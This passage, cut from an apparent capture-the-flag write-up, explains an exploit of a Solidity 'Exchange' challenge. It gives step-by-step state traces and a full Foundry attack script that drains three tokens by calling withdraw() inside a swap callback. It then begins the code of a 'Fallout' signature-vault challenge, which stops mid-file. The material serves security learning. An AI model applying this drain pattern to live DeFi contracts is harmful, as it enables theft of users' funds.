</span><span>    </span><span style=color:#62a35c>setReserves</span><span>(tokenOut, tokenIn, newReservesOut);
</span><span>
</span><span>    </span><span style=color:#0086b3>uint256</span><span> liquidityAfter </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getLiquidity</span><span>(tokenIn, tokenOut);
</span><span>
</span><span>    </span><span style=color:#62a35c>updatePosition</span><span>(tokenIn, </span><span style=color:#a71d5d;font-weight:700>-</span><span style=color:#0086b3>int256</span><span>(amountIn));
</span><span>    </span><span style=color:#62a35c>updatePosition</span><span>(tokenOut, </span><span style=color:#0086b3>int256</span><span>(amountOut));
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>require</span><span>(liquidityAfter </span><span style=color:#a71d5d;font-weight:700>>=</span><span> liquidityBefore, </span><span style=color:#183691>"insufficient liquidity"</span><span>);
</span><span>}
</span></code></pre><p>The <code>amountIn</code> to the <code>swapTokens()</code> will be deducted from the current position.<pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span>    updatePosition(tokenIn, </span><span style=color:#a71d5d;font-weight:700>-</span><span style=color:#0086b3>int256</span><span>(amountIn));
</span><span>    updatePosition(tokenOut, </span><span style=color:#0086b3>int256</span><span>(amountOut));
</span></code></pre><p>So lets do these steps,<pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span>Attack1.doSwap() {
</span><span>    exchange.withdraw(</span><span style=color:#0086b3>address</span><span>(token1), </span><span style=color:#0086b3>200000</span><span>);
</span><span>    </span><span style=color:#969896;font-style:italic>// 200000 token1 drained
</span><span>    </span><span style=color:#969896;font-style:italic>// updatePosition() in withdraw:
</span><span>    </span><span style=color:#969896;font-style:italic>// - currentPosition = 0
</span><span>    </span><span style=color:#969896;font-style:italic>// - newPosition = 0 - 200000 = -200000
</span><span>    </span><span style=color:#969896;font-style:italic>// - swapState.unsettledTokens = 1
</span><span>    </span><span style=color:#969896;font-style:italic>// - swapState.positions[token1] = -200000
</span><span>    exchange.swapTokens(</span><span style=color:#0086b3>address</span><span>(token1), </span><span style=color:#0086b3>address</span><span>(token2), </span><span style=color:#0086b3>200000</span><span>, 0);
</span><span>    </span><span style=color:#969896;font-style:italic>// updatePosition() for token1 in swapTokens:
</span><span>    </span><span style=color:#969896;font-style:italic>// - currentPosition = -200000
</span><span>    </span><span style=color:#969896;font-style:italic>// - newPosition =  -200000 + (-200000)= -400000
</span><span>    </span><span style=color:#969896;font-style:italic>// - swapState.unsettledTokens = 1 (currentPosition!=0 || newPosition!=0)
</span><span>    </span><span style=color:#969896;font-style:italic>// - swapState.positions[token1] = -400000
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// updatePosition() for token2 in swapTokens:
</span><span>    </span><span style=color:#969896;font-style:italic>// - currentPosition = 0
</span><span>    </span><span style=color:#969896;font-style:italic>// - newPosition =  0 + 0 = 0
</span><span>    </span><span style=color:#969896;font-style:italic>// - swapState.unsettledTokens = 0 (newPosition==0)
</span><span>    </span><span style=color:#969896;font-style:italic>// - swapState.positions[token2] = 0 (because amountOut = 0)
</span><span>    </span><span style=color:#969896;font-style:italic>// @notice: Here we can observe some inconsistency between state postions and unsettled tokens.
</span><span>
</span><span>    exchange.withdraw(</span><span style=color:#0086b3>address</span><span>(token2), </span><span style=color:#0086b3>200000</span><span>);
</span><span>    </span><span style=color:#969896;font-style:italic>// 200000 token2 drained
</span><span>    </span><span style=color:#969896;font-style:italic>// updatePosition() in withdraw:
</span><span>    </span><span style=color:#969896;font-style:italic>// - currentPosition = 0
</span><span>    </span><span style=color:#969896;font-style:italic>// - newPosition = 0 - 200000 = -200000
</span><span>    </span><span style=color:#969896;font-style:italic>// - swapState.unsettledTokens = 1 (currentPosition==0)
</span><span>    </span><span style=color:#969896;font-style:italic>// - swapState.positions[token2] = -200000
</span><span>
</span><span>    exchange.swapTokens(</span><span style=color:#0086b3>address</span><span>(token2), </span><span style=color:#0086b3>address</span><span>(token3), </span><span style=color:#0086b3>200000</span><span>, 0);
</span><span>    </span><span style=color:#969896;font-style:italic>// updatePosition() for token2 in swapTokens:
</span><span>    </span><span style=color:#969896;font-style:italic>// - currentPosition = -200000
</span><span>    </span><span style=color:#969896;font-style:italic>// - newPosition =  -200000 + (-200000)= -400000
</span><span>    </span><span style=color:#969896;font-style:italic>// - swapState.unsettledTokens = 1 (currentPosition!=0 || newPosition!=0)
</span><span>    </span><span style=color:#969896;font-style:italic>// - swapState.positions[token2] = -400000
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// updatePosition() for token3 in swapTokens:
</span><span>    </span><span style=color:#969896;font-style:italic>// - currentPosition = 0
</span><span>    </span><span style=color:#969896;font-style:italic>// - newPosition =  0 + 0 = 0
</span><span>    </span><span style=color:#969896;font-style:italic>// - swapState.unsettledTokens = 0 (newPosition==0)
</span><span>    </span><span style=color:#969896;font-style:italic>// - swapState.positions[token3] = 0 (because amountOut = 0)
</span><span>}
</span><span>
</span><span>Attack2.doSwap(){
</span><span>    exchange.withdraw(</span><span style=color:#0086b3>address</span><span>(token3), </span><span style=color:#0086b3>400000</span><span>);
</span><span>    </span><span style=color:#969896;font-style:italic>// 400000 token3 drained
</span><span>    </span><span style=color:#969896;font-style:italic>// updatePosition() in withdraw:
</span><span>    </span><span style=color:#969896;font-style:italic>// - currentPosition = 0
</span><span>    </span><span style=color:#969896;font-style:italic>// - newPosition = 0 - 400000 = -400000
</span><span>    </span><span style=color:#969896;font-style:italic>// - swapState.unsettledTokens = 1 (currentPosition==0)
</span><span>    </span><span style=color:#969896;font-style:italic>// - swapState.positions[token3] = -400000
</span><span>
</span><span>    exchange.swapTokens(</span><span style=color:#0086b3>address</span><span>(token3), </span><span style=color:#0086b3>address</span><span>(token1), </span><span style=color:#0086b3>400000</span><span>, 0);
</span><span>    </span><span style=color:#969896;font-style:italic>// updatePosition() for token3 in swapTokens:
</span><span>    </span><span style=color:#969896;font-style:italic>// - currentPosition = -400000
</span><span>    </span><span style=color:#969896;font-style:italic>// - newPosition =  -400000 + (-400000)= -800000
</span><span>    </span><span style=color:#969896;font-style:italic>// - swapState.unsettledTokens = 1 (currentPosition!=0 || newPosition!=0)
</span><span>    </span><span style=color:#969896;font-style:italic>// - swapState.positions[token3] = -800000
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// updatePosition() for token1 in swapTokens:
</span><span>    </span><span style=color:#969896;font-style:italic>// - currentPosition = 0
</span><span>    </span><span style=color:#969896;font-style:italic>// - newPosition =  0 + 0 = 0
</span><span>    </span><span style=color:#969896;font-style:italic>// - swapState.unsettledTokens = 0 (newPosition==0)
</span><span>    </span><span style=color:#969896;font-style:italic>// - swapState.positions[token1] = 0 (because amountOut = 0)
</span><span>}
</span></code></pre><p>Don't ask me anything please follow the math explained above. Th issues I see here are,<ul><li>Allowing withdraw() during swap<li>nonce being updated after the swap<li>Inconsistency between <code>swapState.positions</code> and <code>swapState.unsettledTokens</code>.<li>Only handling the cases where the <code>currentPosition == 0 || newPosition == 0</code>.</ul><div class=note-container><button class=note-toggle><div class=note-icon><p>Exchange.s.sol</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span style=color:#a71d5d;font-weight:700>pragma solidity ^</span><span style=color:#0086b3>0.8.0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"../src/Exchange.sol"</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>ExchangeSolve </span><span style=color:#a71d5d;font-weight:700>is </span><span style=color:#62a35c>Script </span><span>{
</span><span>    Setup </span><span style=color:#a71d5d;font-weight:700>public </span><span>set </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Setup</span><span>(</span><span style=color:#0086b3>0xd9beE8f7dF07fd718f54ed05CAD77FC0EF1F9A7B</span><span>);
</span><span>    Exchange </span><span style=color:#a71d5d;font-weight:700>public </span><span>exchange </span><span style=color:#a71d5d;font-weight:700>=</span><span> set.</span><span style=color:#62a35c>exchange</span><span>();
</span><span>    Token </span><span style=color:#a71d5d;font-weight:700>public </span><span>token1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> set.</span><span style=color:#62a35c>token1</span><span>();
</span><span>    Token </span><span style=color:#a71d5d;font-weight:700>public </span><span>token2 </span><span style=color:#a71d5d;font-weight:700>=</span><span> set.</span><span style=color:#62a35c>token2</span><span>();
</span><span>    Token </span><span style=color:#a71d5d;font-weight:700>public </span><span>token3 </span><span style=color:#a71d5d;font-weight:700>=</span><span> set.</span><span style=color:#62a35c>token3</span><span>();
</span><span>    </span><span style=color:#0086b3>address</span><span> player </span><span style=color:#a71d5d;font-weight:700>=</span><span> vm.</span><span style=color:#62a35c>envAddress</span><span>(</span><span style=color:#183691>"PLAYER"</span><span>);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#a71d5d;font-weight:700>public </span><span>{
</span><span>        vm.</span><span style=color:#62a35c>startBroadcast</span><span>(vm.</span><span style=color:#62a35c>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player : "</span><span>, player);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Setup : "</span><span>, </span><span style=color:#0086b3>address</span><span>(set));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Exchange : "</span><span>, </span><span style=color:#0086b3>address</span><span>(exchange));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Token1 : "</span><span>, </span><span style=color:#0086b3>address</span><span>(token1));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Token2 : "</span><span>, </span><span style=color:#0086b3>address</span><span>(token2));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Token3 : "</span><span>, </span><span style=color:#0086b3>address</span><span>(token3));
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"isSolved() : "</span><span>, set.</span><span style=color:#62a35c>isSolved</span><span>());
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Exchange balance Token1 : "</span><span>, token1.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(exchange)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Exchange balance Token2 : "</span><span>, token2.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(exchange)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Exchange balance Token3 : "</span><span>, token3.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(exchange)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance Token1 : "</span><span>, token1.</span><span style=color:#62a35c>balanceOf</span><span>(player));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance Token2 : "</span><span>, token2.</span><span style=color:#62a35c>balanceOf</span><span>(player));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance Token3 : "</span><span>, token3.</span><span style=color:#62a35c>balanceOf</span><span>(player));
</span><span>
</span><span>        Attack attack </span><span style=color:#a71d5d;font-weight:700>= new </span><span style=color:#62a35c>Attack</span><span>(</span><span style=color:#0086b3>address</span><span>(set));
</span><span>        attack.</span><span style=color:#62a35c>exploit</span><span>();
</span><span>        Attack2 attack2 </span><span style=color:#a71d5d;font-weight:700>= new </span><span style=color:#62a35c>Attack2</span><span>(</span><span style=color:#0086b3>address</span><span>(set));
</span><span>        attack2.</span><span style=color:#62a35c>exploit</span><span>();
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Exchange balance Token1 : "</span><span>, token1.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(exchange)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Exchange balance Token2 : "</span><span>, token2.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(exchange)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Exchange balance Token3 : "</span><span>, token3.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(exchange)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Attacker balance Token1 : "</span><span>, token1.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(attack)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Attacker balance Token2 : "</span><span>, token2.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(attack)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Attacker 2 balance Token3 : "</span><span>, token3.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(attack2)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"isSolved() : "</span><span>, set.</span><span style=color:#62a35c>isSolved</span><span>());
</span><span>    }
</span><span>
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Attack </span><span style=color:#a71d5d;font-weight:700>is </span><span style=color:#62a35c>SwapCallback</span><span>{
</span><span>    Setup </span><span style=color:#a71d5d;font-weight:700>public </span><span>set;
</span><span>    Exchange </span><span style=color:#a71d5d;font-weight:700>public </span><span>exchange;
</span><span>    Token </span><span style=color:#a71d5d;font-weight:700>public </span><span>token1;
</span><span>    Token </span><span style=color:#a71d5d;font-weight:700>public </span><span>token2;
</span><span>    Token </span><span style=color:#a71d5d;font-weight:700>public </span><span>token3;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>address </span><span>_setup) {
</span><span>        set </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Setup</span><span>(_setup);
</span><span>        exchange </span><span style=color:#a71d5d;font-weight:700>=</span><span> set.</span><span style=color:#62a35c>exchange</span><span>();
</span><span>        token1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> set.</span><span style=color:#62a35c>token1</span><span>();
</span><span>        token2 </span><span style=color:#a71d5d;font-weight:700>=</span><span> set.</span><span style=color:#62a35c>token2</span><span>();
</span><span>        token3 </span><span style=color:#a71d5d;font-weight:700>=</span><span> set.</span><span style=color:#62a35c>token3</span><span>();
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>() </span><span style=color:#a71d5d;font-weight:700>public </span><span>{
</span><span>        exchange.</span><span style=color:#62a35c>swap</span><span>();
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>doSwap</span><span>() </span><span style=color:#a71d5d;font-weight:700>public </span><span>{
</span><span>
</span><span>        exchange.</span><span style=color:#62a35c>withdraw</span><span>(</span><span style=color:#0086b3>address</span><span>(token1), </span><span style=color:#0086b3>200000</span><span>);
</span><span>        exchange.</span><span style=color:#62a35c>swapTokens</span><span>(</span><span style=color:#0086b3>address</span><span>(token1), </span><span style=color:#0086b3>address</span><span>(token2), </span><span style=color:#0086b3>200000</span><span>, 0);
</span><span>
</span><span>        exchange.</span><span style=color:#62a35c>withdraw</span><span>(</span><span style=color:#0086b3>address</span><span>(token2), </span><span style=color:#0086b3>200000</span><span>);
</span><span>        exchange.</span><span style=color:#62a35c>swapTokens</span><span>(</span><span style=color:#0086b3>address</span><span>(token2), </span><span style=color:#0086b3>address</span><span>(token3), </span><span style=color:#0086b3>200000</span><span>, 0);
</span><span>    }
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Attack2 </span><span style=color:#a71d5d;font-weight:700>is </span><span style=color:#62a35c>SwapCallback</span><span>{
</span><span>    Setup </span><span style=color:#a71d5d;font-weight:700>public </span><span>set;
</span><span>    Exchange </span><span style=color:#a71d5d;font-weight:700>public </span><span>exchange;
</span><span>    Token </span><span style=color:#a71d5d;font-weight:700>public </span><span>token1;
</span><span>    Token </span><span style=color:#a71d5d;font-weight:700>public </span><span>token2;
</span><span>    Token </span><span style=color:#a71d5d;font-weight:700>public </span><span>token3;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>address </span><span>_setup) {
</span><span>        set </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Setup</span><span>(_setup);
</span><span>        exchange </span><span style=color:#a71d5d;font-weight:700>=</span><span> set.</span><span style=color:#62a35c>exchange</span><span>();
</span><span>        token1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> set.</span><span style=color:#62a35c>token1</span><span>();
</span><span>        token2 </span><span style=color:#a71d5d;font-weight:700>=</span><span> set.</span><span style=color:#62a35c>token2</span><span>();
</span><span>        token3 </span><span style=color:#a71d5d;font-weight:700>=</span><span> set.</span><span style=color:#62a35c>token3</span><span>();
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>() </span><span style=color:#a71d5d;font-weight:700>public </span><span>{
</span><span>        exchange.</span><span style=color:#62a35c>swap</span><span>();
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>doSwap</span><span>() </span><span style=color:#a71d5d;font-weight:700>public </span><span>{
</span><span>        exchange.</span><span style=color:#62a35c>withdraw</span><span>(</span><span style=color:#0086b3>address</span><span>(token3), </span><span style=color:#0086b3>400000</span><span>);
</span><span>        exchange.</span><span style=color:#62a35c>swapTokens</span><span>(</span><span style=color:#0086b3>address</span><span>(token3), </span><span style=color:#0086b3>address</span><span>(token1), </span><span style=color:#0086b3>400000</span><span>, 0);
</span><span>    }
</span><span>}
</span></code></pre></div></div><hr><h1 id=fallout>Fallout</h1><p>P: "In the aftermath of the Great War, the world lies shattered, but hope endures in the form of Nuka-Cola Caps, the currency of the wasteland. Your mission, should you choose to accept it, is to obtain 1,000,000 Nuka-Cola Caps and secure your place as a true survivor in the barren expanse of post-apocalyptic America."<div class=note-container><button class=note-toggle><div class=note-icon><p>Fallout.sol</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: UNLICENSED
</span><span style=color:#a71d5d;font-weight:700>pragma solidity ^</span><span style=color:#0086b3>0.8.0</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {</span><span style=color:#0086b3>ERC20</span><span>} from "@openzeppelin-contracts-4.8.0/contracts/token/</span><span style=color:#0086b3>ERC20</span><span>/</span><span style=color:#0086b3>ERC20</span><span>.sol";
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Fallout </span><span style=color:#a71d5d;font-weight:700>is ERC20 </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>WrongPlayer</span><span>();
</span><span>    </span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>InvalidSignature</span><span>();
</span><span>
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public immutable</span><span> Qx;
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public immutable</span><span> Qy;
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public immutable</span><span> player;
</span><span>    Vault </span><span style=color:#a71d5d;font-weight:700>public immutable </span><span>vault;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>address </span><span>_player, Vault _vault, </span><span style=color:#0086b3>uint256 </span><span>qx, </span><span style=color:#0086b3>uint256 </span><span>qy) </span><span style=color:#62a35c>ERC20</span><span>(</span><span style=color:#183691>"Nuka-Cola"</span><span>, </span><span style=color:#183691>"CAPS"</span><span>) {
</span><span>        Qx </span><span style=color:#a71d5d;font-weight:700>=</span><span> qx;
</span><span>        Qy </span><span style=color:#a71d5d;font-weight:700>=</span><span> qy;
</span><span>        player </span><span style=color:#a71d5d;font-weight:700>=</span><span> _player;
</span><span>        vault </span><span style=color:#a71d5d;font-weight:700>=</span><span> _vault;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>mint</span><span>(
</span><span>        </span><span style=color:#0086b3>address </span><span>recipient,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>value,
</span><span>        </span><span style=color:#0086b3>uint256</span><span>[</span><span style=color:#0086b3>2</span><span>] </span><span style=color:#a71d5d;font-weight:700>memory </span><span>rs
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>public </span><span>{
</span><span>        </span><span style=color:#0086b3>bytes32</span><span> hash </span><span style=color:#a71d5d;font-weight:700>= keccak256</span><span>(</span><span style=color:#a71d5d;font-weight:700>abi</span><span>.</span><span style=color:#a71d5d;font-weight:700>encode</span><span>(recipient, value));
</span><span>
</span><span>        </span><span style=color:#0086b3>uint256</span><span>[2] memory Q;
</span><span>        Q[0] </span><span style=color:#a71d5d;font-weight:700>=</span><span> Qx;
</span><span>        Q[1] </span><span style=color:#a71d5d;font-weight:700>=</span><span> Qy;
</span><span>
</span><span>        </span><span style=color:#0086b3>bool</span><span> valid </span><span style=color:#a71d5d;font-weight:700>=</span><span> vault.</span><span style=color:#62a35c>validateSignature</span><span>(hash, rs, Q);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#a71d5d;font-weight:700>!</span><span>valid) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>revert </span><span style=color:#62a35c>InvalidSignature</span><span>();
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#62a35c>_mint</span><span>(recipient, value);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>isSolved</span><span>() </span><span style=color:#a71d5d;font-weight:700>public view returns </span><span>(</span><span style=color:#0086b3>bool</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#62a35c>balanceOf</span><span>(player) </span><span style=color:#a71d5d;font-weight:700>>= </span><span style=color:#0086b3>1_000_000 ether</span><span>;
</span><span>    }
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Vault </span><span>{
</span><span>    </span><span style=color:#969896;font-style:italic>// Set parameters for curve.
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public immutable</span><span> a;
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public immutable</span><span> b;
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public immutable</span><span> gx;
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public immutable</span><span> gy;
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public immutable</span><span> p;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>uint256 </span><span>_a, </span><span style=color:#0086b3>uint256 </span><span>_b, </span><span style=color:#0086b3>uint256 </span><span>_gx, </span><span style=color:#0086b3>uint256 </span><span>_gy, </span><span style=color:#0086b3>uint256 </span><span>_p) {
</span><span>        a </span><span style=color:#a71d5d;font-weight:700>=</span><span> _a;
</span><span>        b </span><span style=color:#a71d5d;font-weight:700>=</span><span> _b;
</span><span>        gx </span><span style=color:#a71d5d;font-weight:700>=</span><span> _gx;
</span><span>        gy </span><span style=color:#a71d5d;font-weight:700>=</span><span> _gy;
</span><span>        p </span><span style=color:#a71d5d;font-weight:700>=</span><span> _p;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>/**
</span><span style=color:#969896;font-style:italic>     * @dev Inverse of u in the field of modulo m.
</span><span style=color:#969896;font-style:italic>     */
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>inverseMod</span><span>(</span><span style=color:#0086b3>uint </span><span>u, </span><span style=color:#0086b3>uint </span><span>m) </span><span style=color:#a71d5d;font-weight:700>internal view
</span><span>        </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(</span><span style=color:#0086b3>uint</span><span>)
</span><span>    {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(u </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0 || u == m || m == 0)
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return</span><span> 0;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(u </span><span style=color:#a71d5d;font-weight:700>></span><span> m)
</span><span>            u </span><span style=color:#a71d5d;font-weight:700>=</span><span> u </span><span style=color:#a71d5d;font-weight:700>%</span><span> m;
</span><span>
</span><span>        </span><span style=color:#0086b3>int</span><span> t1;
</span><span>        </span><span style=color:#0086b3>int</span><span> t2 </span><span style=color:#a71d5d;font-weight:700>=</span><span> 1;
</span><span>        </span><span style=color:#0086b3>uint</span><span> r1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> m;
</span><span>        </span><span style=color:#0086b3>uint</span><span> r2 </span><span style=color:#a71d5d;font-weight:700>=</span><span> u;
</span><span>        </span><span style=color:#0086b3>uint</span><span> q;
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>while </span><span>(r2 </span><span style=color:#a71d5d;font-weight:700>!=</span><span> 0) {
</span><span>            q </span><span style=color:#a71d5d;font-weight:700>=</span><span> r1 </span><span style=color:#a71d5d;font-weight:700>/</span><span> r2;
</span><span>            (t1, t2, r1, r2) </span><span style=color:#a71d5d;font-weight:700>= </span><span>(t2, t1 </span><span style=color:#a71d5d;font-weight:700>- </span><span style=color:#0086b3>int</span><span>(q) </span><span style=color:#a71d5d;font-weight:700>*</span><span> t2, r2, r1 </span><span style=color:#a71d5d;font-weight:700>-</span><span> q </span><span style=color:#a71d5d;font-weight:700>*</span><span> r2);
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(t1 </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span> 0)
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return </span><span>(m </span><span style=color:#a71d5d;font-weight:700>- </span><span style=color:#0086b3>uint</span><span>(</span><span style=color:#a71d5d;font-weight:700>-</span><span>t1));
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>uint</span><span>(t1);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>/**
</span><span style=color:#969896;font-style:italic>     * @dev Transform affine coordinates into projective coordinates.
</span><span style=color:#969896;font-style:italic>     */
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>toProjectivePoint</span><span>(</span><span style=color:#0086b3>uint </span><span>x0, </span><span style=color:#0086b3>uint </span><span>y0) </span><span style=color:#a71d5d;font-weight:700>public view
</span><span>        </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(</span><span style=color:#0086b3>uint</span><span>[3] memory P)
</span><span>    {
</span><span>        P[2] </span><span style=color:#a71d5d;font-weight:700>= addmod</span><span>(0, 1, p);
</span><span>        P[0] </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(x0, P[2], p);
</span><span>        P[1] </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(y0, P[2], p);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>/**
</span><span style=color:#969896;font-style:italic>     * @dev Add two points in affine coordinates and return projective point.
</span><span style=color:#969896;font-style:italic>     */
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>addAndReturnProjectivePoint</span><span>(</span><span style=color:#0086b3>uint </span><span>x1, </span><span style=color:#0086b3>uint </span><span>y1, </span><span style=color:#0086b3>uint </span><span>x2, </span><span style=color:#0086b3>uint </span><span>y2) </span><span style=color:#a71d5d;font-weight:700>public view
</span><span>        </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(</span><span style=color:#0086b3>uint</span><span>[3] memory P)
</span><span>    {
</span><span>        </span><span style=color:#0086b3>uint</span><span> x;
</span><span>        </span><span style=color:#0086b3>uint</span><span> y;
</span><span>        (x, y) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>add</span><span>(x1, y1, x2, y2);
</span><span>        P </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>toProjectivePoint</span><span>(x, y);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>/**
